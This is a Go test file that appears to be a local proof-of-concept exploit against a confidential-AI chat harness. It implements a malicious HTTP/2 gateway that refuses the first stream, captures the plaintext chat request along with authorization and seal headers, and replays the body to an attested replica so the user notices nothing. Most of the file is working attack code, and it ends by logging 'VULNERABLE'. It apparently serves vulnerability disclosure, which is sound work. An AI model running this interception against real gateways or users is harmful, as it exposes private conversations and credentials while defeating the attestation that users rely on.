package main

// Reachability PoC (LOCAL ONLY) for confidential-tinfoil-harness, the enclave
// that runs Tinfoil Chat conversations. A chat turn for a pinned model is
// sent by h.turn (agent.go:291-298) through the model client that attest()
// (main.go:132-143) builds: tinfoil.NewClientWithOptions(WithEnclave(replica),
// WithRepo(repo), WithBaseURL(gateway+"/v1/")).HTTPClient() wrapped in
// callerAuth. That request crosses inference-gateway.tinfoil.sh, which is not
// part of the attested TCB. Here the gateway refuses the first HTTP/2 stream.
//
// Only attestation is stubbed (PoCNewClientWithOptionsPresetHPKE presets the
// verified ground truth with the replica's HPKE key). tinfoil-go is the
// harness's pinned v0.15.4-0.20260828072713-251feb041ce8 + EHBP v0.3.2; the
// harness code (routes, turn, callerAuth, testChatHarness) is unmodified.
//
// Run (Go 1.26.6, the harness Dockerfile toolchain):
//   HOME=$(mktemp -d) TINFOIL_USER_CACHE_SECRET=poc SSL_CERT_FILE=../../poc3/certs/ca.pem \
//   POC_CERT_DIR=../../poc3/certs GOTOOLCHAIN=local ../../go1.26.6/bin/go test -run TestPoCHarness -v -count=1 .

import (
	"bytes"
	"crypto/tls"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	ehbpidentity "github.com/tinfoilsh/encrypted-http-body-protocol/identity"
	"github.com/tinfoilsh/tinfoil-go"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

type pocCap struct {
	conn    int
	id      uint32
	headers map[string]string
	body    bytes.Buffer
}

type pocGW struct {
	t       *testing.T
	replica string
	mu      sync.Mutex
	conns   int
	alpn    []string
	caps    []*pocCap
	first   *pocCap
}

func (g *pocGW) serveConn(c *tls.Conn) {
	defer c.Close()
	if c.Handshake() != nil {
		return
	}
	g.mu.Lock()
	g.conns++
	connNo := g.conns
	g.alpn = append(g.alpn, c.ConnectionState().NegotiatedProtocol)
	g.mu.Unlock()
	if c.ConnectionState().NegotiatedProtocol != "h2" {
		return
	}
	pre := make([]byte, len(http2.ClientPreface))
	if _, err := io.ReadFull(c, pre); err != nil {
		return
	}
	fr := http2.NewFramer(c, c)
	fr.WriteSettings()
	dec := hpack.NewDecoder(4096, nil)
	var hb bytes.Buffer
	enc := hpack.NewEncoder(&hb)
	streams := map[uint32]*pocCap{}
	for {
		f, err := fr.ReadFrame()
		if err != nil {
			return
		}
		var ended uint32
		switch f := f.(type) {
		case *http2.SettingsFrame:
			if !f.IsAck() {
				fr.WriteSettingsAck()
			}
		case *http2.PingFrame:
			if !f.IsAck() {
				fr.WritePing(true, f.Data)
			}
		case *http2.HeadersFrame:
			fields, err := dec.DecodeFull(f.HeaderBlockFragment())
			if err != nil {
				return
			}
			s := &pocCap{conn: connNo, id: f.StreamID, headers: map[string]string{}}
			for _, hf := range fields {
				s.headers[hf.Name] = hf.Value
			}
			streams[f.StreamID] = s
			if f.StreamEnded() {
				ended = f.StreamID
			}
		case *http2.DataFrame:
			s := streams[f.StreamID]
			if s == nil {
				continue
			}
			s.body.Write(f.Data())
			if n := uint32(len(f.Data())); n > 0 {
				fr.WriteWindowUpdate(0, n)
				fr.WriteWindowUpdate(f.StreamID, n)
			}
			if f.StreamEnded() {
				ended = f.StreamID
			}
		}
		if ended == 0 {
			continue
		}
		s := streams[ended]
		g.mu.Lock()
		g.caps = append(g.caps, s)
		isFirst := g.first == nil
		if isFirst {
			g.first = s
		}
		first := g.first
		g.mu.Unlock()
		if isFirst {
			fr.WriteRSTStream(ended, http2.ErrCodeRefusedStream)
			continue
		}
		up, _ := http.NewRequest(http.MethodPost, g.replica+s.headers[":path"], bytes.NewReader(first.body.Bytes()))
		up.Header.Set("Ehbp-Encapsulated-Key", first.headers["ehbp-encapsulated-key"])
		up.Header.Set("Accept", "text/event-stream")
		resp, err := (&http.Client{Transport: &http.Transport{}}).Do(up)
		if err != nil {
			g.t.Errorf("gateway upstream: %v", err)
			return
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		hb.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":status", Value: "200"})
		enc.WriteField(hpack.HeaderField{Name: "content-type", Value: resp.Header.Get("Content-Type")})
		enc.WriteField(hpack.HeaderField{Name: "ehbp-response-nonce", Value: resp.Header.Get("Ehbp-Response-Nonce")})
		fr.WriteHeaders(http2.HeadersFrameParam{StreamID: ended, BlockFragment: hb.Bytes(), EndHeaders: true})
		for len(b) > 16384 {
			fr.WriteData(ended, false, b[:16384])
			b = b[16384:]
		}
		fr.WriteData(ended, true, b)
	}
}

func TestPoCHarnessGatewayReadsChatTurn(t *testing.T) {
	dir := os.Getenv("POC_CERT_DIR")
	if dir == "" || os.Getenv("SSL_CERT_FILE") == "" {
		t.Skip("set SSL_CERT_FILE and POC_CERT_DIR")
	}
	cert, err := tls.LoadX509KeyPair(filepath.Join(dir, "gw.pem"), filepath.Join(dir, "gw.key"))
	if err != nil {
		t.Fatal(err)
	}

	// Attested kimi-k3 replica (EHBP server middleware), streaming SSE.
	replicaID, _ := ehbpidentity.NewIdentity()
	var replicaSaw string
	var replicaMu sync.Mutex
	replica := httptest.NewServer(replicaID.Middleware()(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		replicaMu.Lock()
		replicaSaw = string(b)
		replicaMu.Unlock()
		w.Header().Set("Content-Type", "text/event-stream")
		io.WriteString(w, "data: {\"choices\":[{\"delta\":{\"content\":\"answer from the attested replica\"}}]}\n\ndata: [DONE]\n\n")
	})))
	defer replica.Close()

	// Malicious gateway: TLS terminated outside any enclave, cert chains to SSL_CERT_FILE.
	ln, err := tls.Listen("tcp", "127.0.0.1:0", &tls.Config{Certificates: []tls.Certificate{cert}, NextProtos: []string{"h2", "http/1.1"}})
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	gw := &pocGW{t: t, replica: replica.URL}
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go gw.serveConn(c.(*tls.Conn))
		}
	}()
	gatewayURL := "https://" + ln.Addr().String()

	// The harness exactly as its own tests build it ...
	h, _, key := testChatHarness(t, nil)
	h.gateway = gatewayURL
	// ... with the model client built the way attest() builds it (main.go:132-143).
	verified, err := tinfoil.PoCNewClientWithOptionsPresetHPKE(replicaID.MarshalPublicKeyHex(),
		tinfoil.WithEnclave("kimi-k3-inf14-2.tinfoil.containers.tinfoil.dev"),
		tinfoil.WithRepo("tinfoilsh/confidential-kimi-k3"),
		tinfoil.WithBaseURL(gatewayURL+"/v1/"))
	if err != nil {
		t.Fatal(err)
	}
	client := verified.HTTPClient()
	client.Transport = &callerAuth{inner: client.Transport, usageSecret: "test-usage-secret"}
	h.models[0].client = client
	h.autoModel = h.models[0]

	const secret = "PRIVATE: my therapist says my panic attacks started after the audit at Initech"
	in := sendInput(key)
	in["content"] = secret
	events := eventsIn(t, postRoute(h, "/v1/threads/turn", in, "alice"))
	var text strings.Builder
	for _, e := range events {
		if e.Type == "TEXT_MESSAGE_CHUNK" {
			if d, ok := e.Delta.(string); ok {
				text.WriteString(d)
			}
		}
	}
	t.Logf("%s: chat run events: first=%s last=%s assistant=%q", runtime.Version(), events[0].Type, events[len(events)-1].Type, text.String())
	replicaMu.Lock()
	t.Logf("replica decrypted %d bytes (contains user message: %v)", len(replicaSaw), strings.Contains(replicaSaw, secret))
	replicaMu.Unlock()

	time.Sleep(20 * time.Millisecond)
	gw.mu.Lock()
	defer gw.mu.Unlock()
	t.Logf("gateway connections=%d ALPN=%v", gw.conns, gw.alpn)
	var leaked *pocCap
	for i, c := range gw.caps {
		b := c.body.String()
		show := b
		if len(show) > 260 {
			show = show[:260] + "..."
		}
		t.Logf("gateway capture %d (conn %d stream %d): %s %s authorization=%q x-tinfoil-seal=%s x-tinfoil-model=%s body(%d bytes)=%q",
			i, c.conn, c.id, c.headers[":method"], c.headers[":path"], c.headers["authorization"], c.headers["x-tinfoil-seal"], c.headers["x-tinfoil-model"], len(b), show)
		if strings.Contains(b, secret) {
			leaked = c
		}
	}
	if len(gw.alpn) == 0 || gw.alpn[0] != "h2" {
		t.Fatalf("expected h2, got %v", gw.alpn)
	}
	if leaked == nil {
		t.Fatal("gateway did not see plaintext")
	}
	if events[len(events)-1].Type != "RUN_FINISHED" || !strings.Contains(text.String(), "answer from the attested replica") {
		t.Errorf("expected the chat turn to complete normally")
	}
	t.Logf("VULNERABLE: the gateway read the full plaintext chat-completion request (system prompt + user turn); the chat turn completed normally")
}
